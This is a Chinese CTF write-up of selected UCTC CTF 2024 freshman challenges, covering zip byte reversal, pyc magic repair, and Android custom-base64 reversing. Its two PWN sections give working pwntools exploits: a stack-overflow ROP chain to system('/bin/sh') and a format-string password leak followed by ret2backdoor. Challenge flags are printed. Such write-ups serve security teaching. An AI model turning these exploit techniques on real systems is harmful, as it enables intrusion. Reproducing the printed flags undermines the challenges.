---
title: UCTC CTF 2024 高校新生网安赛 部分 WriteUp
contest: UCTC CTF 2024 高校新生网安赛
year: 2024
difficulty: easy
vuln_type: [forensic_disk, ret2libc, fmt_string, reverse, web_unknown]
tags: [UCTC, 新生赛, zip-reverse, 010-Editor, 栈溢出, partial-RELRO, amd64, format-string, %s, pyinstxtractor, pyc, magic-number, md5, Android, smali, base64, 码表替换]
attack_chain: ["MISC 神秘的文件: 010 Editor 看到 zip 头被反转 → reverse() 还原 → 改头 50 4B 03 04 → 解压", "PWN EZ_Stack: 栈溢出 offset=0x4c → pop_rdi_ret + /bin/sh + system", "PWN userlogin: format string %13$s 泄漏 rootPassword → buffer overflow ret2backdoor 0x401262", "REVERSE hash&py: pyinstxtractor 解包 → pyc 修 magic 0x0A0D0D55 (3.8) → md5 4 段拼接", "REVERSE just_re_java: jadx 看 smali → Enc.ah 改码表 base64 → Flag 类 $() 拼结果"]
key_payload: "pyc magic 0x0A0D0D55 (Python 3.8) 修复后 md5 解密"
one_liner: UCTC 高校新生赛 5 大题：MISC zip 反转 + PWN 栈溢出 + 格式化串 + py 反编译 + Java smali
lesson: 新生赛涵盖 reverse/pwn/web/misc；md5 4 段拼接 + base64 码表替换是入门 reverse
quality: high
---

# UCTC CTF 2024 高校新生网安赛 部分 WriteUp

原文 https://www.ctfiot.com/218709.html （天权信安）

## MISC: 神秘的文件
```python
def reverse(inp, out):
    with open(inp, 'rb') as f: data = f.read()
    r_data = data[::-1]
    with open(out, 'wb') as f: f.write(r_data)

reverse('么什是这.zip', 'output.zip')
```
- 010 Editor 看 zip 头是反转的
- 文件名提示"这是什么"（"这是 什么"）
- 翻转后头改成 `50 4B 03 04`（版本号位不影响解压）
- 解压得 flag.txt

**flag:** `flag{m1sc_st39_I5_S0_inT3rEst1n9!}`

## PWN

### EZ_Stack
```
Arch: amd64-64-little
RELRO: Partial
Stack: No canary
NX: enabled
PIE: No PIE (0x400000)
```
```python
from pwn import *
context(arch="amd64", os="linux", log_level="debug")
file = "./pwn"
p = process(file)
elf = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

system = p64(0x40079D)
pop_rdi_ret = p64(0x4007a2)
bin_sh = p64(0x602048)
ret = p64(0x40053e)
gift = p64(0x400781)

ru("!!!!\n")
payload = b'a' * 0x4c
payload += p32(0x54)
payload += pop_rdi_ret + bin_sh + system
# ret + gift
for i in payload: sd(bytearray([i]))  # 单字节发送
p.interactive()
```

### userlogin
```python
def login(password): io.sendlineafter(b'Password: ', password)
login(b'supersecureuser')
io.recvline()
io.sendline(b'%13$s')              # format string leak
rootPassword = io.recvline()
login(rootPassword)
payload = b'A' * 0x28 + p64(0x401262)  # ret2backdoor
io.recvline()
io.sendline(payload)
io.interactive()
```

## REVERSE

### hash&py
- 64 位 PE exe，由图标判断是 PyInstaller
- pyinstxtractor 解包
- Python 3.8 magic: `MAGIC_3_8 = 0x0A0D0D55`
- 修复 hash.pyc 头
- md5 4 段拼接：`flag{h@shiSe@sy}`

### just_re_java (Android smali)
```java
boolean isCorrect = Enc.ah(userInput);
if (isCorrect) {
    MainActivity.access$100(this.this$0, $(0, 2, -17515));
} else {
    MainActivity.access$100(this.this$0, $(2, 4, -31808));
}
```
- Enc.ah 返回 bool
- 用 `$(0, 32, -11843)` 拼接最终 flag
- Enc 类里**改了码表的 base64**（字符串加密）
- 复刻到 java 在线运行 → 直接拿密文 + 改码表 base64 解密

## 教学价值
- **010 Editor** + **hex 编辑** 是 MISC 入门
- **栈溢出** 经典 `pop_rdi_ret` 链
- **format string** `%n$s` 任意位置读
- **pyinstxtractor** + **pyc 修 magic** 是 Python reverse 入门
- **jadx / smali** 是 Android reverse 入门
- **base64 码表替换** 是入门级加密

## flag 汇总
- MISC: `flag{m1sc_st39_I5_S0_inT3rEst1n9!}`
- REVERSE hash&py: `flag{h@shiSe@sy}`
